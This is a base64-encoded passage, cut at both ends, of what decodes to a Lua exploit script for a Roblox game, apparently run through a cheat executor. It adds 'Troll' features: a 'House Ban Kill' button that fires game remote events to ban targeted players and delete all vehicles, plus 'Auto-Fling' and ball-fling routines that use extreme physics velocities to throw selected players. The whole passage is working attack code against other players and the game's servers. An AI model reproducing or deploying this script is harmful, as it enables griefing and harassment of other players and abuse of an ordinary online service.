ICAgICAgICAgICBpZiB2Lk5hbWUgPT0gIkh1bWFub2lkUm9vdFBhcnQiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBiID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIik6RmluZEZpcnN0Q2hpbGQodi5QYXJlbnQuTmFtZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSAiQmFuUGxheWVyRnJvbUhvdXNlIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzJdID0gYiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzNdID0gdi5QYXJlbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxUGxheWUxclRyaWdnZTFyRXZlbjF0Iik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gIkRlbGV0ZUFsbFZlaGljbGVzIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFDYTFyIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpUcm9sbDpBZGRCdXR0b24oewogICAgTmFtZSA9ICJIb3VzZSBCYW4gS2lsbCIsCiAgICBDYWxsYmFjayA9IGhvdXNlQmFuS2lsbAp9KQoKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBjYW0gPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQpsb2NhbCBjdXJyZW50UGxheWVycywgc2VsZWN0ZWRQbGF5ZXIgPSB7fSwgbmlsCmxvY2FsIHZpZXdpbmcgPSBmYWxzZQpsb2NhbCBmbGluZ0FjdGl2ZSA9IGZhbHNlCgpUcm9sbDpBZGRUb2dnbGUoewogICAgTmFtZSA9ICJBdXRvLUZsaW5nIiwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oc3RhdGUpCgogICAgICAgIGZsaW5nQWN0aXZlID0gc3RhdGUKICAgICAgICBpZiBzdGF0ZSBhbmQgc2VsZWN0ZWRQbGF5ZXJOYW1lIHRoZW4KICAgICAgICAgICAgbG9jYWwgdGFyZ2V0ID0gUGxheWVyczpGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpCiAgICAgICAgICAgIGlmIG5vdCB0YXJnZXQgb3Igbm90IHRhcmdldC5DaGFyYWN0ZXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGxvY2FsIHJvb3QgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGxvY2FsIHRSb290ID0gdGFyZ2V0LkNoYXJhY3RlciBhbmQgdGFyZ2V0LkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGlmIG5vdCByb290IG9yIG5vdCB0Um9vdCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgbG9jYWwgY2hhciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCBodW0gPSBjaGFyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICBsb2NhbCBvcmlnaW5hbCA9IHJvb3QuQ0ZyYW1lCgpsb2NhbCBhcmdzID0gewoJIkNsZWFyQWxsVG9vbHMiCn0KZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFDbGVhMXJUb29sMXMiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKCnRhc2sud2FpdCgwLjIpCgoKICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgIFsxXSA9ICJQaWNraW5nVG9vbHMiLAogICAgICAgICAgICAgICAgWzJdID0gIkNvdWNoIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIik6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjMpCiAgICAgICAgICAgIGxvY2FsIHRvb2wgPSBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ291Y2giKQogICAgICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gY2hhcgogICAgICAgICAgICBlbmQKCQkJCXRhc2sud2FpdCgwLjIpCgkJCQlnYW1lOkdldFNlcnZpY2UoIlZpcnR1YWxJbnB1dE1hbmFnZXIiKTpTZW5kS2V5RXZlbnQodHJ1ZSwgRW51bS5LZXlDb2RlLkYsIGZhbHNlLCBnYW1lKQp0YXNrLndhaXQoMC4yNSkKCiAgICAgICAgICAgIHdvcmtzcGFjZS5GYWxsZW5QYXJ0c0Rlc3Ryb3lIZWlnaHQgPSAwLzAKICAgICAgICAgICAgbG9jYWwgYnYgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIpCiAgICAgICAgICAgIGJ2Lk5hbWUgPSAiRmxpbmdGb3JjZSIKICAgICAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTgsIDllOCwgOWU4KQogICAgICAgICAgICBidi5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KDEvMCwgMS8wLCAxLzApCiAgICAgICAgICAgIGJ2LlBhcmVudCA9IHJvb3QKICAgICAgICAgICAgaHVtOlNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgZmFsc2UpCiAgICAgICAgICAgIGh1bS5QbGF0Zm9ybVN0YW5kID0gZmFsc2UKICAgICAgICAgICAgY2FtLkNhbWVyYVN1YmplY3QgPSB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikgb3IgdFJvb3Qgb3IgaHVtCgogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGxvY2FsIGFuZ2xlID0gMAogICAgICAgICAgICAgICAgbG9jYWwgcGFydHMgPSB7cm9vdH0KICAgICAgICAgICAgICAgIHdoaWxlIGZsaW5nQWN0aXZlIGFuZCB0YXJnZXQgYW5kIHRhcmdldC5DaGFyYWN0ZXIgYW5kIHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdEh1bSA9IHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICAgICAgaWYgdEh1bS5TaXQgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICBhbmdsZSArPSA1MAoKICAgICAgICAgICAgICAgICAgICBmb3IgXywgcGFydCBpbiBpcGFpcnMocGFydHMpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHBvc194ID0gdGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlBvc2l0aW9uLlgKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcG9zX3kgPSB0YXJnZXQuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24uWQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBwb3NfeiA9IHRhcmdldC5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbi5aCiAgICAgICAgICAgICAgICAgICAgICAgIHBvc194ID0gcG9zX3ggKyAodGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5LlggLyAxLjUpCiAgICAgICAgICAgICAgICAgICAgICAgIHBvc195ID0gcG9zX3kgKyAodGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5LlkgLyAxLjUpCiAgICAgICAgICAgICAgICAgICAgICAgIHBvc196ID0gcG9zX3ogKyAodGFyZ2V0LkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LlZlbG9jaXR5LlogLyAxLjUpCiAgICAgICAgICAgICAgICAgICAgICAgIHJvb3QuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhwb3NfeCwgcG9zX3ksIHBvc196KSAqIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoYW5nbGUpLCAwLCAwKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICByb290LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKICAgICAgICAgICAgICAgICAgICByb290LlJvdFZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBmbGluZ0FjdGl2ZSA9IGZhbHNlCiAgICAgICAgICAgICAgICBidjpEZXN0cm95KCkKICAgICAgICAgICAgICAgIGh1bTpTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIHRydWUpCiAgICAgICAgICAgICAgICBodW0uUGxhdGZvcm1TdGFuZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByb290LkNGcmFtZSA9IG9yaWdpbmFsCiAgICAgICAgICAgICAgICBjYW0uQ2FtZXJhU3ViamVjdCA9IGh1bQogICAgICAgICAgICAgICAgZm9yIF8sIHAgaW4gcGFpcnMoY2hhcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHA6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcC5WZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgICAgICAgICBwLlJvdFZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGh1bTpVbmVxdWlwVG9vbHMoKQogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCgpsb2NhbCBmdW5jdGlvbiBGbGluZ0JhbGwodGFyZ2V0KQoKICAgIGxvY2FsIHBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgbG9jYWwgcGxheWVyID0gcGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIikKICAgIGxvY2FsIGhycCA9IGNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgbG9jYWwgYmFja3BhY2sgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJCYWNrcGFjayIpCiAgICBsb2NhbCBTZXJ2ZXJCYWxscyA9IHdvcmtzcGFjZS5Xb3Jrc3BhY2VDb206V2FpdEZvckNoaWxkKCIwMDFfU29jY2VyQmFsbHMiKQoKICAgIGxvY2FsIGZ1bmN0aW9uIEdldEJhbGwoKQogICAgICAgIGlmIG5vdCBiYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiU29jY2VyQmFsbCIpIHRoZW4KICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKTpJbnZva2VTZXJ2ZXIoIlBpY2tpbmdUb29scyIsICJTb2NjZXJCYWxsIikKICAgICAgICBlbmQKICAgICAgICByZXBlYXQgdGFzay53YWl0KCkgdW50aWwgYmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlNvY2NlckJhbGwiKQogICAgICAgIGJhY2twYWNrLlNvY2NlckJhbGwuUGFyZW50ID0gY2hhcmFjdGVyCiAgICAgICAgcmVwZWF0IHRhc2sud2FpdCgpIHVudGlsIFNlcnZlckJhbGxzOkZpbmRGaXJzdENoaWxkKCJTb2NjZXIiIC4uIHBsYXllci5OYW1lKQogICAgICAgIGNoYXJhY3Rlci5Tb2NjZXJCYWxsLlBhcmVudCA9IGJhY2twYWNrCiAgICAgICAgcmV0dXJuIFNlcnZlckJhbGxzOkZpbmRGaXJzdENoaWxkKCJTb2NjZXIiIC4uIHBsYXllci5OYW1lKQogICAgZW5kCgogICAgbG9jYWwgQmFsbCA9IFNlcnZlckJhbGxzOkZpbmRGaXJzdENoaWxkKCJTb2NjZXIiIC4uIHBsYXllci5OYW1lKSBvciBHZXRCYWxsKCkKICAgIEJhbGwuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICBCYWxsLk1hc3NsZXNzID0gdHJ1ZQogICAgQmFsbC5DdXN0b21QaHlzaWNhbFByb3BlcnRpZXMgPSBQaHlzaWNhbFByb3BlcnRpZXMubmV3KDAuMDAwMSwgMCwgMCkKCiAgICBpZiB0YXJnZXQgfj0gcGxheWVyIHRoZW4KICAgICAgICBsb2NhbCB0Y2hhciA9IHRhcmdldC5DaGFyYWN0ZXIKICAgICAgICBpZiB0Y2hhciBhbmQgdGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBhbmQgdGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkIikgdGhlbgogICAgICAgICAgICBsb2NhbCB0cm9vdCA9IHRjaGFyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgbG9jYWwgdGh1bSA9IHRjaGFyLkh1bWFub2lkCgogICAgICAgICAgICBpZiBCYWxsOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIkJvZHlWZWxvY2l0eSIpIHRoZW4KICAgICAgICAgICAgICAgIEJhbGw6RmluZEZpcnN0Q2hpbGRXaGljaElzQSgiQm9keVZlbG9jaXR5Iik6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgbG9jYWwgYnYgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIpCiAgICAgICAgICAgIGJ2Lk5hbWUgPSAiRmxpbmdQb3dlciIKICAgICAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTgsIDllOCwgOWU4KQogICAgICAgICAgICBidi5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSwgbWF0aC5odWdlLCBtYXRoLmh1Z2UpCiAgICAgICAgICAgIGJ2LlAgPSA5ZTkwMAogICAgICAgICAgICBidi5QYXJlbnQgPSBCYWxsCgogICAgICAgICAgICB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gdGh1bQogICAgICAgICAgICBsb2NhbCBTdGFydFRpbWUgPSBvcy50aW1lKCkKICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICBpZiB0cm9vdC5WZWxvY2l0eS5NYWduaXR1ZGUgPiAwIHRoZW4KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgcG9zX3ggPSB0cm9vdC5Qb3NpdGlvbi5YICsgKHRyb290LlZlbG9jaXR5LlggLyAxLjUpCiAgICAgICAgICAgICAgICBsb2NhbCBwb3NfeSA9IHRyb290LlBvc2l0aW9uLlkgKyAodHJvb3QuVmVsb2NpdHkuWSAvIDEuNSkKICAgICAgICAgICAgICAgIGxvY2FsIHBvc196ID0gdHJvb3QuUG9zaXRpb24uWiArICh0cm9vdC5WZWxvY2l0eS5aIC8gMS41KQoKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgcG9zaXRpb24gPSBWZWN0b3IzLm5ldyhwb3NfeCwgcG9zX3ksIHBvc196KQogICAgICAgICAgICAgICAgQmFsbC5DRnJhbWUgPSBDRnJhbWUubmV3KHBvc2l0aW9uKQogICAgICAgICAgICAgICAgQmFsbC5PcmllbnRhdGlvbiArPSBWZWN0b3IzLm5ldyg0NSwgNjAsIDMwKQplbHNlCmZvciBpLCB2IGluIHBhaXJzKHRjaGFyOkdldENoaWxkcmVuKCkpIGRvCmlmIHY6SXNBKCJCYXNlUGFydCIpIGFuZCB2LkNhbkNvbGxpZGUgYW5kIG5vdCB2LkFuY2hvcmVkIHRoZW4KQmFsbC5DRnJhbWUgPSB2LkNGcmFtZQp0YXNrLndhaXQoMS82MDAwKQplbmQKZW5kCmVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDEvNjAwMCkKICAgICAgICAgICAgdW50aWwgdHJvb3QuVmVsb2NpdHkuTWFnbml0dWRlID4gMTAwMCBvciB0aHVtLkhlYWx0aCA8PSAwIG9yIG5vdCB0Y2hhcjpJc0Rlc2NlbmRhbnRPZih3b3Jrc3BhY2UpIG9yIHRhcmdldC5QYXJlbnQgfj0gcGxheWVycwogICAgICAgICAgICB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gaHVtYW5vaWQKICAgICAgICBlbmQKICAgIGVuZAplbmQKClRyb2xsOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkZsaW5nIHVzaW5nIGJhbGwiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgRmxpbmdCYWxsKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpW3NlbGVjdGVkUGxheWVyTmFtZV0pCiAgICBlbmQKfSkKCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoJ1BsYXllcnMnKQpsb2NhbCBscGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKbG9jYWwgZnVuY3Rpb24gaXNJdGVtSW5JbnZlbnRvcnkoaXRlbU5hbWUpCiAgICBmb3IgXywgaXRlbSBpbiBwYWlycyhscGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgaXRlbS5OYW1lID09IGl0ZW1OYW1lIHRoZW4KICAgICAgICAgICAgcmV0dXJuIHRydWUKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIGZhbHNlCmVuZAoKbG9jYWwgZnVuY3Rpb24gZXF1aXBJdGVtKGl0ZW1OYW1lKQogICAgbG9jYWwgaXRlbSA9IGxwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoaXRlbU5hbWUpCiAgICBpZiBpdGVtIHRoZW4KICAgICAgICBscGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woaXRlbSkKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIHVuZXF1aXBJdGVtKGl0ZW1OYW1lKQogICAgbG9jYWwgaXRlbSA9IGxwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKGl0ZW1OYW1lKQogICAgaWYgaXRlbSB0aGVuCiAgICAgICAgaXRlbS5QYXJlbnQgPSBscGxheWVyLkJhY2twYWNrCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBBY3RpdmVBdXRvRmxpbmcodGFyZ2V0UGxheWVyKQogICAgaWYgbm90IGlzSXRlbUluSW52ZW50b3J5KCJDb3VjaCIpIHRoZW4KICAgICAgICBsb2NhbCBhcmdzID0geyBbMV0gPSAiUGlja2luZ1Rvb2xzIiwgWzJdID0gIkNvdWNoIiB9CiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgZW5kCgogICAgZXF1aXBJdGVtKCJDb3VjaCIpCiAgICBnZXRnZW52KCkuZmxpbmdsb29wID0gdHJ1ZQoKICAgIHdoaWxlIGdldGdlbnYoKS5mbGluZ2xvb3AgZG8KICAgICAgICBsb2NhbCBmdW5jdGlvbiBmbGluZ2xvb3BmaXgoKQogICAgICAgICAgICBsb2NhbCBQbGF5ZXJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikKICAgICAgICAgICAgbG9jYWwgUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgICAgICBsb2NhbCBBbGxCb29sID0gZmFsc2UKCiAgICAgICAgICAgIGxvY2FsIFNraWRGbGluZyA9IGZ1bmN0aW9uKFRhcmdldFBsYXllcikKICAgICAgICAgICAgICAgIGxvY2FsIENoYXJhY3RlciA9IFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGxvY2FsIEh1bWFub2lkID0gQ2hhcmFjdGVyIGFuZCBDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICBsb2NhbCBSb290UGFydCA9IEh1bWFub2lkIGFuZCBIdW1hbm9pZC5Sb290UGFydAogICAgICAgICAgICAgICAgbG9jYWwgVENoYXJhY3RlciA9IFRhcmdldFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgIGxvY2FsIFRIdW1hbm9pZCwgVFJvb3RQYXJ0LCBUSGVhZCwgQWNjZXNzb3J5LCBIYW5kbGUKCiAgICAgICAgICAgICAgICBpZiBUQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgVEh1bWFub2lkID0gVENoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgVEh1bWFub2lkIGFuZCBUSHVtYW5vaWQuUm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIFRSb290UGFydCA9IFRIdW1hbm9pZC5Sb290UGFydAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBUQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikgdGhlbgogICAgICAgICAgICAgICAgICAgIFRIZWFkID0gVENoYXJhY3Rlci5IZWFkCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIFRDaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJBY2Nlc3NvcnkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgQWNjZXNzb3J5ID0gVENoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkFjY2Vzc29yeSIpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIEFjY2Vzc29yeSBhbmQgQWNjZXNzb3J5OkZpbmRGaXJzdENoaWxkKCJIYW5kbGUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgSGFuZGxlID0gQWNjZXNzb3J5LkhhbmRsZQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaWYgQ2hhcmFjdGVyIGFuZCBIdW1hbm9pZCBhbmQgUm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIFJvb3RQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSA8IDUwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLk9sZFBvcyA9IFJvb3RQYXJ0LkNGcmFtZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIFRIdW1hbm9pZCBhbmQgVEh1bWFub2lkLlNpdCBhbmQgbm90IEFsbEJvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB1bmVxdWlwSXRlbSgiQ291Y2giKQogICAgICAgICAgICAgICAgICAgICAgICBnZXRnZW52KCkuZmxpbmdsb29wID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgVEhlYWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gVEhlYWQKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgbm90IFRIZWFkIGFuZCBIYW5kbGUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gSGFuZGxlCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIFRIdW1hbm9pZCBhbmQgVFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IFRIdW1hbm9pZAogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBpZiBub3QgVENoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZFdoaWNoSXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIEZQb3MgPSBmdW5jdGlvbihCYXNlUGFydCwgUG9zLCBBbmcpCiAgICAgICAgICAgICAgICAgICAgICAgIFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoQmFzZVBhcnQuUG9zaXRpb24pICogUG9zICogQW5nCiAgICAgICAgICAgICAgICAgICAgICAgIENoYXJhY3RlcjpTZXRQcmltYXJ5UGFydENGcmFtZShDRnJhbWUubmV3KEJhc2VQYXJ0LlBvc2l0aW9uKSAqIFBvcyAqIEFuZykKICAgICAgICAgICAgICAgICAgICAgICAgUm9vdFBhcnQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTcsIDllNyAqIDEwLCA5ZTcpCiAgICAgICAgICAgICAgICAgICAgICAgIFJvb3RQYXJ0LlJvdFZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoOWU4LCA5ZTgsIDllOCkKICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgU0ZCYXNlUGFydCA9IGZ1bmN0aW9uKEJhc2VQYXJ0KQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUaW1lVG9XYWl0ID0gMgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUaW1lID0gdGljaygpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEFuZ2xlID0gMAogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIFJvb3RQYXJ0IGFuZCBUSHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEJhc2VQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSA8IDUwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQW5nbGUgPSBBbmdsZSArIDEwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIDEuNSwgMCkgKyBUSHVtYW5vaWQuTW92ZURpcmVjdGlvbiAqIEJhc2VQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSAvIDEuMjUsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5n